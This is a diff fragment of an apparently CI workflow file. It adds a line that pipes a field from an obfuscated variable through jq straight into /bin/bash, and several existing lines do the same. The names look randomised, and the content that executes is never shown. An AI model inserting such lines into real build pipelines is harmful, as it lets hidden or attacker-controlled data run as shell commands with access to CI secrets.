@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$p8434" | jq -r .u5658 | /bin/bash
           printf '%s' "$pmf7435" | jq -r .rdof967 | /bin/bash
           printf '%s' "$ku9" | jq -r .xo740 | /bin/bash
+          echo $qzlzu3 | jq -r .dwdon751 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
